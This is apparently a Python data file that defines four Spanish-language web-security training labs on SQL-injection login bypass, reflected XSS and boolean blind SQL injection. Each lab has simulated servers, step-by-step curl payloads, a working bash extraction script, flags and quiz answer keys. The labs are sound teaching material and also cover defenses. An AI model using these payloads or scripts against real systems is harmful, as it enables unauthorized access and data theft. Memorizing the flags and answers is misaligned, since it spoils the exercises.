"""Contenido estilo AWS de los laboratorios de la pista «Seguridad Web»."""

_MI_IP = "10.10.14.7"

_FORM_LOGIN = """<!DOCTYPE html>
<html lang="es"><head><title>Intranet · Ingreso</title></head>
<body>
  <h1>Intranet académica</h1>
  <form method="POST" action="/login.php">
    <input type="text" name="username" placeholder="usuario">
    <input type="password" name="password" placeholder="contraseña">
    <button type="submit">Ingresar</button>
  </form>
</body></html>"""

_ERROR_SQL = (
    "<b>Warning</b>: mysqli_query(): You have an error in your SQL syntax; check the manual that "
    "corresponds to your MySQL server version for the right syntax to use near ''' AND password = 'x'' "
    "at line 1 in <b>/var/www/html/login.php</b> on line <b>14</b>"
)

# Patrón de un bypass con OR verdadero + comentario. Tolera mayúsculas/minúsculas y espacios.
_PATRON_BYPASS = r"'\s*or\s*'?1'?\s*=\s*'?1'?\s*(--|#)"
_PATRON_OR_SIN_COMENTARIO = r"'\s*or\s*'?1'?\s*=\s*'?1"
_PATRON_COMILLA = r"username=[^&\n]*'"


def _http_login(ip: str, nombre: str, flag: str) -> dict:
    return {
        "ip": ip,
        "nombre": nombre,
        "mac": "08:00:27:4b:30:" + ip.split(".")[-1].zfill(2)[-2:],
        "so": "Linux",
        "servicios": [
            {"puerto": 22, "servicio": "ssh", "version": "OpenSSH 8.9p1 Ubuntu 3ubuntu0.6"},
            {"puerto": 80, "servicio": "http", "version": "Apache httpd 2.4.52 ((Ubuntu))"},
            {"puerto": 3306, "servicio": "mysql", "version": "MySQL 8.0.36", "estado": "filtered"},
        ],
        "http": [
            {"ruta": "/", "cuerpo": '<html><body><a href="/login.php">Ingresar a la intranet</a></body></html>'},
            {"ruta": "/login.php", "cuerpo": _FORM_LOGIN},
            {"ruta": "/login.php", "metodo": "POST", "cuando": _PATRON_BYPASS, "cuerpo": f"Bienvenido, admin. {flag}"},
            {"ruta": "/login.php", "metodo": "POST", "cuando": _PATRON_OR_SIN_COMENTARIO, "cuerpo": "Usuario o contraseña incorrectos."},
            {"ruta": "/login.php", "metodo": "POST", "cuando": _PATRON_COMILLA, "estado": 500, "cuerpo": _ERROR_SQL},
            {"ruta": "/login.php", "metodo": "POST", "cuerpo": "Usuario o contraseña incorrectos."},
        ],
    }


_TEORIA_SQLI = (
    "<h3>El patrón vulnerable</h3>"
    "<p>Una aplicación arma la consulta pegando lo que escribe el usuario:</p>"
    "<pre>$sql = \"SELECT * FROM usuarios WHERE username = '\" . $_POST['username'] .\n"
    "       \"' AND password = '\" . $_POST['password'] . \"'\";</pre>"
    "<p>Si el usuario escribe <code>ana</code>, la consulta es la esperada. Pero si escribe algo con "
    "comillas, deja de ser «un nombre» y pasa a ser <strong>parte del código SQL</strong>.</p>"
    "<h3>Leer la consulta como la lee la base de datos</h3>"
    "<table><thead><tr><th>Lo que escribes en usuario</th><th>Consulta resultante</th><th>Efecto</th></tr></thead><tbody>"
    "<tr><td><code>ana</code></td><td><code>... username = 'ana' AND password = 'x'</code></td><td>Normal</td></tr>"
    "<tr><td><code>'</code></td><td><code>... username = ''' AND ...</code></td><td>Error de sintaxis: confirma la inyección</td></tr>"
    "<tr><td><code>' OR '1'='1</code></td><td><code>... = '' OR '1'='1' AND password = 'x'</code></td><td>Falla: <code>AND</code> se evalúa antes que <code>OR</code></td></tr>"
    "<tr><td><code>' OR '1'='1' -- </code></td><td><code>... = '' OR '1'='1' -- ' AND password = 'x'</code></td><td>Todo después de <code>--</code> es comentario: entra</td></tr>"
    "</tbody></table>"
    "<div class=\"nota\"><p>En MySQL el comentario <code>--</code> necesita un espacio después. Por "
    "eso los payloads terminan en <code>-- </code> (con espacio) o usan <code>#</code>.</p></div>"
    "<h3>La defensa</h3>"
    "<p><strong>Consultas parametrizadas</strong> (prepared statements): el motor recibe la consulta "
    "y los datos por separado, así que la entrada nunca se interpreta como código.</p>"
    "<pre>$stmt = $db-&gt;prepare(\"SELECT * FROM usuarios WHERE username = ? AND password = ?\");\n"
    "$stmt-&gt;execute([$usuario, $hash]);</pre>"
)

SQLI_BASICO = {
    "nombre": "SQL Injection: Nivel Básico",
    "descripcion": (
        "Entra a una intranet sin conocer ninguna contraseña: confirma la inyección con una comilla, "
        "entiende por qué falla el primer payload y construye uno que funcione."
    ),
    "resumen_cierre": (
        "<p>Seguiste el método completo: reconocer el formulario, confirmar la inyección con un error, "
        "entender la precedencia de <code>AND</code> sobre <code>OR</code> y neutralizar el resto de "
        "la consulta con un comentario.</p>"
        "<div class=\"importante\"><p>El mensaje de error de la tarea 3 también es un fallo: revela la "
        "ruta del archivo y el motor de base de datos. En producción los errores se registran, no se muestran.</p></div>"
    ),
    "secciones": [
        {
            "titulo": "Inyección SQL 101",
            "duracion": 12,
            "objetivos": [
                "Reconocer código vulnerable a inyección SQL.",
                "Predecir cómo cambia la consulta según la entrada.",
                "Explicar por qué las consultas parametrizadas lo evitan.",
            ],
            "html": (
                "<div class=\"escenario\"><p>La intranet académica tiene un formulario de ingreso hecho "
                "a mano hace años. Te pidieron comprobar si un atacante podría entrar sin credenciales.</p></div>"
                + _TEORIA_SQLI
                + "<p>OWASP ubica la inyección en la categoría <strong>A03:2021 Injection</strong> de su Top 10.</p>"
            ),
            "pasos": [],
            "entorno": None,
        },
        {
            "titulo": "Bypass de login",
            "duracion": 20,
            "objetivos": [
                "Confirmar un punto de inyección provocando un error.",
                "Construir un payload que anule la verificación de contraseña.",
                "Obtener acceso y capturar la flag.",
            ],
            "html": (
                "<h3>Tu misión</h3>"
                "<p>Autentícate en <code>intranet.lab</code> (<code>192.168.56.30</code>) sin conocer la "
                "contraseña de nadie. Envía el formulario con <code>curl</code> y lee la respuesta.</p>"
                "<div class=\"tip\"><p><code>--data-urlencode</code> codifica por ti los espacios y las "
                "comillas del payload, así no tienes que escribir <code>%27</code> a mano.</p></div>"
            ),
            "pasos": [
                ("Identifica el servicio web", "<p>Confirma qué expone el objetivo.</p>", "nmap -sV 192.168.56.30", "22/tcp    open  ssh      OpenSSH 8.9p1 ...\n80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))\n3306/tcp  filtered mysql ..."),
                ("Lee el formulario", "<p>Mira el HTML: qué campos tiene y a dónde se envía.</p>", "curl -s http://192.168.56.30/login.php", '<form method="POST" action="/login.php">\n    <input type="text" name="username" ...>\n    <input type="password" name="password" ...>'),
                (
                    "Prueba un ingreso normal",
                    "<p>Así responde la aplicación a credenciales incorrectas. Ese mensaje es tu línea base.</p>",
                    "curl -s http://192.168.56.30/login.php -d 'username=ana&password=1234'",
                    "Usuario o contraseña incorrectos.",
                ),
                (
                    "Confirma la inyección con una comilla",
                    "<p>Una sola comilla rompe la sintaxis si la entrada se concatena: el error lo confirma.</p>",
                    "curl -s http://192.168.56.30/login.php --data-urlencode \"username='\" -d 'password=x'",
                    "Warning: mysqli_query(): You have an error in your SQL syntax; ...",
                ),
                (
                    "Prueba el OR sin comentario",
                    "<p>Intenta <code>' OR '1'='1</code>. Según la tabla de la teoría, ¿qué debería pasar?</p>",
                    "curl -s http://192.168.56.30/login.php --data-urlencode \"username=' OR '1'='1\" -d 'password=x'",
                    "Usuario o contraseña incorrectos.",
                ),
                (
                    "Neutraliza la contraseña con un comentario",
                    "<p>Agrega <code>-- </code> (con espacio) para que el resto de la consulta se ignore.</p>",
                    "curl -s http://192.168.56.30/login.php --data-urlencode \"username=' OR '1'='1' -- \" -d 'password=x'",
                    "Bienvenido, admin. FLAG{...}",
                ),
            ],
            "entorno": {
                "prompt": "estudiante@kali:~$",
                "banner": "Objetivo autorizado: intranet.lab (192.168.56.30).",
                "escenario": {"host": "kali", "ip": _MI_IP, "archivos": {"objetivo.txt": "intranet.lab -> 192.168.56.30\nFormulario: /login.php (POST username, password)\n"}, "red": [_http_login("192.168.56.30", "intranet.lab", "FLAG{sqli_basico_bypass}")]},
                "comandos": [],
            },
        },
    ],
    "flag": {
        "pista": "' OR '1'='1 solo no basta porque AND se evalúa antes que OR: termina el usuario con un comentario SQL (-- con espacio).",
        "paso_a_paso": "curl -s http://192.168.56.30/login.php --data-urlencode \"username=' OR '1'='1' -- \" -d 'password=x'",
    },
    "examen": [
        {"enunciado": "¿Cuál es la defensa correcta contra la inyección SQL?", "tipo": "opcion_multiple", "opciones": ["Escapar las comillas a mano", "Consultas parametrizadas (prepared statements)", "Ocultar los mensajes de error", "Limitar el largo del campo"], "respuesta": "Consultas parametrizadas (prepared statements)"},
        {"enunciado": "¿Por qué el payload ' OR '1'='1 (sin comentario) no permitió entrar?", "tipo": "opcion_multiple", "opciones": ["Porque AND se evalúa antes que OR", "Porque falta cerrar el paréntesis", "Porque la base es PostgreSQL", "Porque la contraseña era correcta"], "respuesta": "Porque AND se evalúa antes que OR"},
        {"enunciado": "¿Qué confirma que un campo es inyectable al enviar una sola comilla?", "tipo": "opcion_multiple", "opciones": ["Que la página cargue más lento", "Un error de sintaxis SQL en la respuesta", "Que pida captcha", "Que cambie la URL"], "respuesta": "Un error de sintaxis SQL en la respuesta"},
        {"enunciado": "Escribe el símbolo que inicia un comentario de una línea en SQL estándar (dos caracteres).", "tipo": "abierta", "respuesta": "--"},
    ],
}

XSS = {
    "nombre": "Cross-Site Scripting Reflejado",
    "descripcion": (
        "Comprueba que el buscador de una tienda devuelve tu texto sin escapar y construye un "
        "payload que ejecutaría JavaScript en el navegador de otra persona."
    ),
    "resumen_cierre": (
        "<p>Probaste la secuencia típica: ver si la entrada se refleja, si el HTML se interpreta "
        "(<code>&lt;b&gt;</code>) y finalmente si se puede inyectar un <code>&lt;script&gt;</code>.</p>"
        "<div class=\"importante\"><p>Defensas: escapar la salida según el contexto (HTML, atributo, "
        "JavaScript), una <strong>Content-Security-Policy</strong> que prohíba scripts en línea y "
        "cookies de sesión con <code>HttpOnly</code> para que <code>document.cookie</code> no las vea.</p></div>"
    ),
    "secciones": [
        {
            "titulo": "XSS reflejado",
            "duracion": 12,
            "objetivos": [
                "Explicar cómo una entrada reflejada termina ejecutándose en el navegador.",
                "Diferenciar XSS reflejado, almacenado y basado en DOM.",
                "Nombrar tres defensas complementarias.",
            ],
            "html": (
                "<div class=\"escenario\"><p>La tienda de la universidad tiene un buscador. Un estudiante "
                "notó que lo que escribe aparece «tal cual» en la página de resultados y lo reportó.</p></div>"
                "<h3>Cómo ocurre</h3>"
                "<p>El servidor toma el parámetro <code>q</code> de la URL y lo pega en el HTML de la respuesta:</p>"
                "<pre>&lt;p&gt;Resultados para: &lt;?= $_GET['q'] ?&gt;&lt;/p&gt;</pre>"
                "<p>Si <code>q</code> contiene etiquetas, el navegador las interpreta. Si contiene "
                "<code>&lt;script&gt;</code>, lo ejecuta <strong>con los permisos del sitio</strong>: puede leer "
                "cookies, hacer peticiones en nombre de la víctima o cambiar la página.</p>"
                "<table><thead><tr><th>Tipo</th><th>Dónde vive el payload</th><th>Cómo llega a la víctima</th></tr></thead><tbody>"
                "<tr><td>Reflejado</td><td>En la petición (URL)</td><td>Un enlace manipulado</td></tr>"
                "<tr><td>Almacenado</td><td>En la base de datos (comentario, perfil)</td><td>Al visitar la página</td></tr>"
                "<tr><td>DOM</td><td>En el JavaScript del cliente</td><td>Código que usa <code>innerHTML</code> con datos de la URL</td></tr>"
                "</tbody></table>"
                "<div class=\"nota\"><p>La consola muestra el HTML como texto: aquí verás el payload reflejado, "
                "pero no se ejecuta. Justo eso es lo que confirma la vulnerabilidad.</p></div>"
            ),
            "pasos": [],
            "entorno": None,
        },
        {
            "titulo": "Probando el buscador",
            "duracion": 18,
            "objetivos": [
                "Confirmar que un parámetro se refleja sin escapar.",
                "Inyectar una etiqueta script en la respuesta.",
                "Leer la flag que deja el servidor al detectar el payload.",
            ],
            "html": (
                "<h3>Tu misión</h3>"
                "<p>Demuestra el XSS reflejado en <code>tienda.lab</code> (<code>192.168.56.31</code>). Cuando "
                "la respuesta incluya tu <code>&lt;script&gt;</code> sin escapar, el servidor de pruebas "
                "agrega la flag al final.</p>"
                "<div class=\"tip\"><p>Pon la URL entre comillas dobles: así la consola no interpreta "
                "<code>&lt;</code>, <code>&gt;</code> ni <code>?</code> por su cuenta.</p></div>"
            ),
            "pasos": [
                ("Haz una búsqueda normal", "<p>Observa dónde aparece tu texto en el HTML.</p>", 'curl -s "http://192.168.56.31/buscar?q=zapatos"', "<h1>Tienda</h1>\n<p>Resultados para: zapatos</p>\n<p>0 productos encontrados.</p>"),
                ("Prueba si interpreta HTML", "<p>Si <code>&lt;b&gt;</code> vuelve tal cual (y no como <code>&amp;lt;b&amp;gt;</code>), no se está escapando.</p>", 'curl -s "http://192.168.56.31/buscar?q=<b>hola</b>"', "<p>Resultados para: <b>hola</b></p>"),
                ("Revisa las cabeceras de seguridad", "<p>¿Hay una Content-Security-Policy que frene scripts en línea?</p>", "curl -I http://192.168.56.31/buscar", "HTTP/1.1 200 OK\nServer: nginx 1.18.0\nContent-Type: text/html; charset=UTF-8\nSet-Cookie: sesion=...; Path=/   (sin HttpOnly, sin CSP)"),
                ("Inyecta un script", "<p>El payload clásico de prueba. Mira el final de la respuesta.</p>", 'curl -s "http://192.168.56.31/buscar?q=<script>alert(1)</script>"', "<p>Resultados para: <script>alert(1)</script></p>\n<!-- payload reflejado sin escapar: FLAG{...} -->"),
            ],
            "entorno": {
                "prompt": "estudiante@kali:~$",
                "banner": "Objetivo autorizado: tienda.lab (192.168.56.31).",
                "escenario": {
                    "host": "kali",
                    "ip": _MI_IP,
                    "red": [
                        {
                            "ip": "192.168.56.31",
                            "nombre": "tienda.lab",
                            "servicios": [{"puerto": 80, "servicio": "http", "version": "nginx 1.18.0"}],
                            "http": [
                                {"ruta": "/", "cuerpo": '<h1>Tienda</h1><form action="/buscar"><input name="q"></form>'},
                                {
                                    "ruta": "/buscar",
                                    "cuando": r"<\s*script",
                                    "cabeceras": {"Set-Cookie": "sesion=7f3a9c1e; Path=/"},
                                    "cuerpo": "<h1>Tienda</h1>\n<p>Resultados para: {{q}}</p>\n<p>0 productos encontrados.</p>\n<!-- payload reflejado sin escapar: FLAG{xss_reflejado_basico} -->",
                                },
                                {"ruta": "/buscar", "cabeceras": {"Set-Cookie": "sesion=7f3a9c1e; Path=/"}, "cuerpo": "<h1>Tienda</h1>\n<p>Resultados para: {{q}}</p>\n<p>0 productos encontrados.</p>"},
                            ],
                        }
                    ],
                },
                "comandos": [],
            },
        },
    ],
    "flag": {
        "pista": "Si el parámetro q aparece tal cual en el HTML, prueba con una etiqueta <script>. Pon la URL entre comillas dobles.",
        "paso_a_paso": 'curl -s "http://192.168.56.31/buscar?q=<script>alert(1)</script>" — la flag aparece en el comentario HTML del final.',
    },
    "examen": [
        {"enunciado": "En un XSS reflejado, ¿dónde viaja el payload?", "tipo": "opcion_multiple", "opciones": ["En la base de datos", "En la petición, por ejemplo en la URL", "En un archivo del servidor", "En la cookie de sesión"], "respuesta": "En la petición, por ejemplo en la URL"},
        {"enunciado": "¿Qué atributo de cookie impide que JavaScript la lea con document.cookie?", "tipo": "opcion_multiple", "opciones": ["Secure", "HttpOnly", "SameSite", "Path"], "respuesta": "HttpOnly"},
        {"enunciado": "¿Cuál es la defensa principal contra XSS?", "tipo": "opcion_multiple", "opciones": ["Escapar la salida según el contexto", "Usar HTTPS", "Bloquear la IP del atacante", "Validar el largo de la URL"], "respuesta": "Escapar la salida según el contexto"},
        {"enunciado": "¿Qué cabecera HTTP permite prohibir scripts en línea en una página?", "tipo": "opcion_multiple", "opciones": ["X-Powered-By", "Content-Security-Policy", "Cache-Control", "Accept-Language"], "respuesta": "Content-Security-Policy"},
    ],
}

_CONFIG_BAK = """<?php
// config.php.bak — copia olvidada en el servidor (no debería ser pública)
$db_host = 'localhost';
$db_user = 'webapp';
$db_pass = 'Sup3rS3cr3t!';
// TODO: pasar el login a consultas preparadas, hoy concatena:
// $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
"""

SQLI_DEMO = {
    "nombre": "SQL Injection: Bypass de Login",
    "descripcion": (
        "Laboratorio introductorio con entorno real: identifica y explota un formulario de login "
        "vulnerable a inyección SQL, en consola simulada o en tu propio contenedor."
    ),
    "resumen_cierre": (
        "<p>Encontraste dos fallas: un respaldo de configuración expuesto (<code>config.php.bak</code>) "
        "que revela cómo se arma la consulta, y la inyección que te dejó entrar como administrador.</p>"
        "<div class=\"tip\"><p>Si usaste el entorno real, repite el ataque ahí: la diferencia entre "
        "simulado y real es que ahí puedes leer el código de la aplicación (<code>cat app.py</code>) y ver "
        "exactamente la línea vulnerable.</p></div>"
    ),
    "secciones": [
        {
            "titulo": "Introducción a SQL Injection",
            "duracion": 10,
            "objetivos": [
                "Explicar qué es SQL Injection y por qué sigue siendo común.",
                "Identificar el patrón de código vulnerable.",
                "Reconocer el impacto de una inyección exitosa.",
            ],
            "html": (
                "<div class=\"escenario\"><p>Una empresa te contrató para revisar el portal de empleados "
                "<code>192.168.56.10</code> antes de publicarlo. Tienes autorización por escrito para "
                "probar el formulario de ingreso.</p></div>"
                + _TEORIA_SQLI
                + "<h3>Impacto real</h3><ul><li>Saltarse la autenticación (lo que harás aquí).</li>"
                "<li>Extraer toda la base: usuarios, hashes, datos personales.</li>"
                "<li>Modificar o borrar información.</li></ul>"
            ),
            "pasos": [],
            "entorno": None,
        },
        {
            "titulo": "Bypass de login vulnerable",
            "duracion": 25,
            "objetivos": [
                "Hacer reconocimiento del objetivo.",
                "Encontrar información filtrada que confirme cómo se arma la consulta.",
                "Construir y enviar el payload, y capturar la flag.",
            ],
            "html": (
                "<h3>Tu misión</h3>"
                "<p>Autentícate en el portal sin conocer ninguna contraseña. Puedes trabajar en la "
                "<strong>consola simulada</strong> o iniciar el <strong>entorno real</strong>: un contenedor "
                "propio con la aplicación vulnerable corriendo dentro.</p>"
                "<div class=\"nota\"><p>En el entorno real la aplicación escucha en "
                "<code>127.0.0.1:5000</code> dentro del contenedor: usa "
                "<code>curl -s http://127.0.0.1:5000/login</code> en vez de la IP del laboratorio.</p></div>"
            ),
            "pasos": [
                ("Reconocimiento", "<p>Confirma qué servicios expone el portal.</p>", "nmap -sV 192.168.56.10", "22/tcp    open  ssh      OpenSSH 8.9p1 ...\n80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))"),
                ("Busca archivos olvidados", "<p>Los respaldos (<code>.bak</code>, <code>.old</code>, <code>~</code>) a veces quedan públicos. Mira lo que se descargó del servidor.</p>", "ls -la", "-rw-r--r-- 1 estudiante estudiante ... config.php.bak\n-rw-r--r-- 1 estudiante estudiante ... notas.txt"),
                ("Lee el respaldo", "<p>El comentario confirma que la consulta concatena la entrada.</p>", "cat config.php.bak", "// $sql = \"SELECT * FROM users WHERE username = '$user' AND password = '$pass'\";"),
                ("Inspecciona el formulario", "<p>Confirma los nombres de los campos.</p>", "curl -s http://192.168.56.10/login.php", '<input type="text" name="username" ...>\n<input type="password" name="password" ...>'),
                ("Confirma la inyección", "<p>Una comilla sola rompe la consulta.</p>", "curl -s http://192.168.56.10/login.php --data-urlencode \"username='\" -d 'password=x'", "Warning: mysqli_query(): You have an error in your SQL syntax; ..."),
                ("Envía el payload", "<p>OR verdadero y comentario para anular la contraseña.</p>", "curl -s http://192.168.56.10/login.php --data-urlencode \"username=' OR '1'='1' -- \" -d 'password=x'", "Bienvenido, admin. FLAG{...}"),
            ],
            "entorno": {
                "prompt": "estudiante@kali:~$",
                "banner": "Objetivo autorizado: portal de empleados (192.168.56.10).",
                "escenario": {
                    "host": "kali",
                    "ip": _MI_IP,
                    "archivos": {"config.php.bak": _CONFIG_BAK, "notas.txt": "Descargado de http://192.168.56.10/config.php.bak durante el reconocimiento.\n"},
                    "red": [_http_login("192.168.56.10", "portal.lab", "FLAG{sql_injection_1s_ez}")],
                },
                "comandos": [],
            },
        },
    ],
    "flag": {
        "pista": "Un comentario SQL (-- con espacio) al final del usuario anula la verificación de la contraseña.",
        "paso_a_paso": "curl -s http://192.168.56.10/login.php --data-urlencode \"username=' OR '1'='1' -- \" -d 'password=x'",
    },
    "examen": [
        {"enunciado": "¿Qué te reveló el archivo config.php.bak?", "tipo": "opcion_multiple", "opciones": ["La contraseña del administrador del portal", "Que la consulta de login concatena la entrada del usuario", "La versión del servidor web", "Nada útil"], "respuesta": "Que la consulta de login concatena la entrada del usuario"},
        {"enunciado": "¿Por qué el payload termina en «-- » con un espacio?", "tipo": "opcion_multiple", "opciones": ["Porque MySQL exige un espacio después de -- para tratarlo como comentario", "Por estética", "Para cerrar la comilla", "Para que curl lo envíe"], "respuesta": "Porque MySQL exige un espacio después de -- para tratarlo como comentario"},
        {"enunciado": "¿Cuál es la corrección de fondo para este login?", "tipo": "opcion_multiple", "opciones": ["Borrar config.php.bak", "Usar consultas parametrizadas", "Ocultar los errores", "Cambiar el puerto del servidor"], "respuesta": "Usar consultas parametrizadas"},
        {"enunciado": "¿Qué categoría del OWASP Top 10 (2021) incluye la inyección SQL?", "tipo": "opcion_multiple", "opciones": ["A01 Broken Access Control", "A03 Injection", "A07 Identification and Authentication Failures", "A10 SSRF"], "respuesta": "A03 Injection"},
    ],
}

BLIND = {
    "nombre": "Inyección SQL a Ciegas (Blind SQLi)",
    "descripcion": (
        "Sin errores visibles, extrae un dato de la base con inyección ciega basada en booleanos: "
        "pregunta sí o no, observa la respuesta y automatiza la extracción."
    ),
    "resumen_cierre": (
        "<p>Convertiste un formulario que solo dice «existe / no existe» en un oráculo: con preguntas "
        "de verdadero o falso averiguaste el largo de la flag, su primer carácter y la extrajiste completa.</p>"
        "<div class=\"importante\"><p>Ocultar los errores no arregla la inyección. La defensa sigue "
        "siendo la misma: consultas parametrizadas, más un límite de intentos por IP para frenar la "
        "automatización.</p></div>"
    ),
    "secciones": [
        {
            "titulo": "SQLi a ciegas",
            "duracion": 14,
            "objetivos": [
                "Explicar cómo se extrae información sin mensajes de error.",
                "Construir condiciones booleanas con SUBSTRING y LENGTH.",
                "Calcular cuántas peticiones requiere una extracción.",
            ],
            "html": (
                "<div class=\"escenario\"><p>Después de un reporte, el equipo de desarrollo «arregló» el "
                "login ocultando los errores de base de datos. Te piden verificar si de verdad quedó seguro.</p></div>"
                "<h3>El oráculo</h3>"
                "<p>La página responde <em>Usuario existe.</em> o <em>Usuario no encontrado.</em> Si la "
                "consulta sigue siendo inyectable, puedes agregar una condición y ver cuál de las dos "
                "respuestas obtienes:</p>"
                "<table><thead><tr><th>Usuario enviado</th><th>Respuesta</th><th>Conclusión</th></tr></thead><tbody>"
                "<tr><td><code>admin' AND 1=1 -- </code></td><td>Usuario existe.</td><td>La condición se evalúa</td></tr>"
                "<tr><td><code>admin' AND 1=2 -- </code></td><td>Usuario no encontrado.</td><td>Hay inyección ciega</td></tr>"
                "</tbody></table>"
                "<h3>Funciones útiles</h3>"
                "<ul><li><code>LENGTH(x)</code>: largo de un texto.</li>"
                "<li><code>SUBSTRING(x, pos, 1)</code>: el carácter en la posición <code>pos</code>.</li>"
                "<li><code>(SELECT flag FROM secretos)</code>: el dato que quieres leer.</li></ul>"
                "<div class=\"nota\"><p>Con 30 caracteres y unas 60 opciones por carácter, la fuerza bruta "
                "carácter a carácter son hasta 1800 peticiones. Con búsqueda binaria sobre el código ASCII "
                "bastan unas 7 por carácter: por eso se automatiza.</p></div>"
            ),
            "pasos": [],
            "entorno": None,
        },
        {
            "titulo": "Extrayendo un carácter a la vez",
            "duracion": 25,
            "objetivos": [
                "Confirmar la inyección ciega con condiciones verdadera y falsa.",
                "Averiguar el largo y el primer carácter del secreto.",
                "Automatizar la extracción con un script.",
            ],
            "html": (
                "<h3>Tu misión</h3>"
                "<p>Extrae el contenido de la tabla <code>secretos</code> del servidor "
                "<code>clientes.lab</code> (<code>192.168.56.32</code>). Empieza a mano para entender el "
                "oráculo y termina con el script <code>blind.sh</code> que te dejó el equipo.</p>"
            ),
            "pasos": [
                ("Condición verdadera", "<p>Si ves <em>Usuario existe.</em>, tu condición se está evaluando.</p>", "curl -s http://192.168.56.32/login.php --data-urlencode \"username=admin' AND 1=1 -- \"", "Usuario existe."),
                ("Condición falsa", "<p>La misma petición con algo falso. Si la respuesta cambia, tienes un oráculo.</p>", "curl -s http://192.168.56.32/login.php --data-urlencode \"username=admin' AND 1=2 -- \"", "Usuario no encontrado."),
                ("Averigua el largo", "<p>Prueba largos hasta que la respuesta sea verdadera. Aquí ya te damos el correcto.</p>", "curl -s http://192.168.56.32/login.php --data-urlencode \"username=admin' AND LENGTH((SELECT flag FROM secretos))=30 -- \"", "Usuario existe."),
                ("Primer carácter", "<p>¿Empieza por F? Prueba también con otra letra para comparar.</p>", "curl -s http://192.168.56.32/login.php --data-urlencode \"username=admin' AND SUBSTRING((SELECT flag FROM secretos),1,1)='F' -- \"", "Usuario existe."),
                ("Revisa el script", "<p>Lee qué hace antes de ejecutarlo: nunca ejecutes un script que no entiendes.</p>", "cat blind.sh", "#!/bin/bash\n# Extrae (SELECT flag FROM secretos) con búsqueda binaria sobre ASCII\n..."),
                ("Automatiza la extracción", "<p>Ejecuta el script y mira cómo arma la flag carácter por carácter.</p>", "bash blind.sh", "[*] largo: 30\n[+] FLAG{b\n...\n[+] FLAG{...}"),
            ],
            "entorno": {
                "prompt": "estudiante@kali:~$",
                "banner": "Objetivo autorizado: clientes.lab (192.168.56.32). Los errores SQL están ocultos.",
                "escenario": {
                    "host": "kali",
                    "ip": _MI_IP,
                    "archivos": {
                        "blind.sh": (
                            "#!/bin/bash\n# Extrae (SELECT flag FROM secretos) con búsqueda binaria sobre ASCII\n"
                            "URL=http://192.168.56.32/login.php\nfor pos in $(seq 1 30); do\n  bajo=32; alto=126\n"
                            "  while [ $bajo -lt $alto ]; do\n    medio=$(( (bajo + alto) / 2 ))\n"
                            "    payload=\"admin' AND ASCII(SUBSTRING((SELECT flag FROM secretos),$pos,1))>$medio -- \"\n"
                            "    if curl -s $URL --data-urlencode \"username=$payload\" | grep -q existe; then bajo=$((medio+1)); else alto=$medio; fi\n"
                            "  done\n  printf \"\\\\x$(printf %x $bajo)\"\ndone\n"
                        ),
                    },
                    "red": [
                        {
                            "ip": "192.168.56.32",
                            "nombre": "clientes.lab",
                            "servicios": [{"puerto": 80, "servicio": "http", "version": "Apache httpd 2.4.52"}],
                            "http": [
                                {"ruta": "/login.php", "cuerpo": _FORM_LOGIN},
                                {"ruta": "/login.php", "metodo": "POST", "cuando": r"SUBSTRING\(.+,\s*1\s*,\s*1\s*\)\s*=\s*'F'", "cuerpo": "Usuario existe."},
                                {"ruta": "/login.php", "metodo": "POST", "cuando": r"LENGTH\(.+\)\s*=\s*30\b", "cuerpo": "Usuario existe."},
                                {"ruta": "/login.php", "metodo": "POST", "cuando": r"'\s*AND\s+1\s*=\s*1\b", "cuerpo": "Usuario existe."},
                                {"ruta": "/login.php", "metodo": "POST", "cuando": r"(SUBSTRING|LENGTH|AND)", "cuerpo": "Usuario no encontrado."},
                                {"ruta": "/login.php", "metodo": "POST", "cuando": r"username=admin(&|\n|$)", "cuerpo": "Usuario existe."},
                                {"ruta": "/login.php", "metodo": "POST", "cuerpo": "Usuario no encontrado."},
                            ],
                        }
                    ],
                },
                "comandos": [
                    {
                        "comando": "bash blind.sh",
                        "patron": r"(bash\s+|sh\s+)?(\./)?blind\.sh",
                        "salida": (
                            "[*] objetivo: http://192.168.56.32/login.php\n[*] largo de (SELECT flag FROM secretos): 30\n"
                            "[+] F\n[+] FL\n[+] FLAG\n[+] FLAG{blind\n[+] FLAG{blind_sqli\n[+] FLAG{blind_sqli_boolean\n"
                            "[+] FLAG{blind_sqli_boolean_based}\n[*] 210 peticiones en total (7 por carácter)"
                        ),
                    },
                    {
                        "comando": "sqlmap -u http://192.168.56.32/login.php --data 'username=admin' --dump",
                        "patron": r"sqlmap\s+.*",
                        "salida": (
                            "[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n"
                            "[INFO] POST parameter 'username' appears to be 'AND boolean-based blind' injectable\n"
                            "Database: clientes\nTable: secretos\n+--------------------------------+\n| flag                           |\n"
                            "+--------------------------------+\n| FLAG{blind_sqli_boolean_based} |\n+--------------------------------+"
                        ),
                    },
                ],
            },
        },
    ],
    "flag": {
        "pista": "Confirma el oráculo con AND 1=1 y AND 1=2. Luego lee blind.sh y ejecútalo: hace la extracción por ti.",
        "paso_a_paso": "bash blind.sh — imprime la flag completa tras extraerla carácter por carácter.",
    },
    "examen": [
        {"enunciado": "En una inyección ciega basada en booleanos, ¿de qué depende la información que obtienes?", "tipo": "opcion_multiple", "opciones": ["De los mensajes de error", "De si la respuesta cambia según la condición sea verdadera o falsa", "Del tiempo de carga del servidor", "De las cookies"], "respuesta": "De si la respuesta cambia según la condición sea verdadera o falsa"},
        {"enunciado": "¿Qué función devuelve un carácter en una posición dada?", "tipo": "opcion_multiple", "opciones": ["LENGTH", "SUBSTRING", "CONCAT", "COUNT"], "respuesta": "SUBSTRING"},
        {"enunciado": "¿Por qué ocultar los errores SQL no arregla la vulnerabilidad?", "tipo": "opcion_multiple", "opciones": ["Porque la consulta sigue concatenando la entrada", "Porque los errores vuelven a aparecer", "Porque el servidor es lento", "Porque la base es antigua"], "respuesta": "Porque la consulta sigue concatenando la entrada"},
        {"enunciado": "¿Qué técnica reduce las peticiones por carácter a unas 7?", "tipo": "opcion_multiple", "opciones": ["Fuerza bruta alfabética", "Búsqueda binaria sobre el código ASCII", "Probar solo vocales", "Usar UNION SELECT"], "respuesta": "Búsqueda binaria sobre el código ASCII"},
    ],
}

LABS = [SQLI_BASICO, XSS, SQLI_DEMO, BLIND]
